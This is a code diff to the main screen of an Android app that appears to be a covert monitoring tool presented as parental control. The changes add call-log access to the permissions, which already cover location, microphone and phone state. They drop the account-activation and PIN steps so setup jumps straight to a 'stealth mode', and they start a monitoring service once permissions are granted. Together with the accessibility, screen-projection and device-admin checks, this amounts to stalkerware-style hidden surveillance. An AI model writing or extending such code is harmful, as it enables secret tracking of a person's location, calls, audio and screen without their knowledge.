@@ -36,7 +36,8 @@ class MainActivity : AppCompatActivity() {
         android.Manifest.permission.ACCESS_FINE_LOCATION,
         android.Manifest.permission.ACCESS_COARSE_LOCATION,
         android.Manifest.permission.RECORD_AUDIO,
-        android.Manifest.permission.READ_PHONE_STATE
+        android.Manifest.permission.READ_PHONE_STATE,
+        android.Manifest.permission.READ_CALL_LOG
     )
 
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -178,33 +179,40 @@ class MainActivity : AppCompatActivity() {
             }
         }
 
-        // Activate Button
-        binding.btnActivate.setOnClickListener {
-            val email = binding.etEmail.text.toString()
-            if (email.isNotEmpty()) {
-                Toast.makeText(this, "تم تفعيل الحساب بنجاح ✅", Toast.LENGTH_SHORT).show()
-                binding.accountSection.visibility = View.GONE
-                binding.activitiesSection.visibility = View.VISIBLE
-            } else {
-                Toast.makeText(this, "يرجى إدخال البريد الإلكتروني", Toast.LENGTH_SHORT).show()
-            }
-        }
-
-        // Confirm Activities
+        // Confirm Activities - Directly finish setup and go stealth
         binding.btnConfirmActivities.setOnClickListener {
-            binding.activitiesSection.visibility = View.GONE
-            binding.pinSection.visibility = View.VISIBLE
-        }
-
-        // Finish Button
-        binding.btnFinish.setOnClickListener {
             triggerStealthMode()
         }
     }
 
     private fun updateAllStatuses() {
         val allBasic = basicPermissions.all { ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED }
-        updateStep(binding.stepBasic, allBasic)
+        val locationServiceEnabled = isLocationEnabled()
+
+        if (allBasic) {
+            if (!locationServiceEnabled) {
+                binding.stepBasic.ivStepStatus.setImageResource(R.drawable.ic_error)
+                binding.stepBasic.ivStepStatus.setColorFilter(Color.parseColor("#EF4444"))
+                binding.stepBasic.btnStepAction.visibility = View.VISIBLE
+                binding.stepBasic.btnStepAction.text = "تفعيل GPS 🌍"
+                binding.stepBasic.tvStepSubtitle.text = "الأذونات مقبولة، لكن خدمة الموقع (GPS) معطلة في الهاتف ⚠️"
+                binding.stepBasic.btnStepAction.setOnClickListener {
+                    try {
+                        startActivity(Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS))
+                    } catch (e: Exception) {
+                        Toast.makeText(this, "تعذر فتح إعدادات الموقع", Toast.LENGTH_SHORT).show()
+                    }
+                }
+            } else {
+                updateStep(binding.stepBasic, true)
+            }
+        } else {
+            updateStep(binding.stepBasic, false)
+            binding.stepBasic.btnStepAction.text = "طلب الأذونات"
+            binding.stepBasic.btnStepAction.setOnClickListener {
+                requestPermissionsLauncher.launch(basicPermissions)
+            }
+        }
 
         updateStep(binding.stepNotifications, isNotificationServiceEnabled())
         updateStep(binding.stepAccessibility, isAccessibilityServiceEnabled())
@@ -216,9 +224,19 @@ class MainActivity : AppCompatActivity() {
         updateStep(binding.stepProjection, MonitoringForegroundService.isProjectionActive())
         updateStep(binding.stepAdmin, parentalControlManager.isAdminActive())
 
-        // Show account section only if permissions are mostly done
-        if (allBasic && isAccessibilityServiceEnabled() && MonitoringForegroundService.isProjectionActive()) {
-            binding.accountSection.visibility = View.VISIBLE
+        // Show activities section directly once permissions are granted
+        if (allBasic && locationServiceEnabled && isAccessibilityServiceEnabled() && MonitoringForegroundService.isProjectionActive()) {
+            binding.activitiesSection.visibility = View.VISIBLE
+        }
+    }
+
+    private fun isLocationEnabled(): Boolean {
+        val locationManager = getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
+        return try {
+            locationManager.isProviderEnabled(android.location.LocationManager.GPS_PROVIDER) ||
+            locationManager.isProviderEnabled(android.location.LocationManager.NETWORK_PROVIDER)
+        } catch (e: Exception) {
+            false
         }
     }
 
@@ -235,7 +253,10 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    private val requestPermissionsLauncher = registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { updateAllStatuses() }
+    private val requestPermissionsLauncher = registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) {
+        updateAllStatuses()
+        MonitoringForegroundService.start(this)
+    }
 
     private fun isNotificationServiceEnabled(): Boolean {
         val names = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
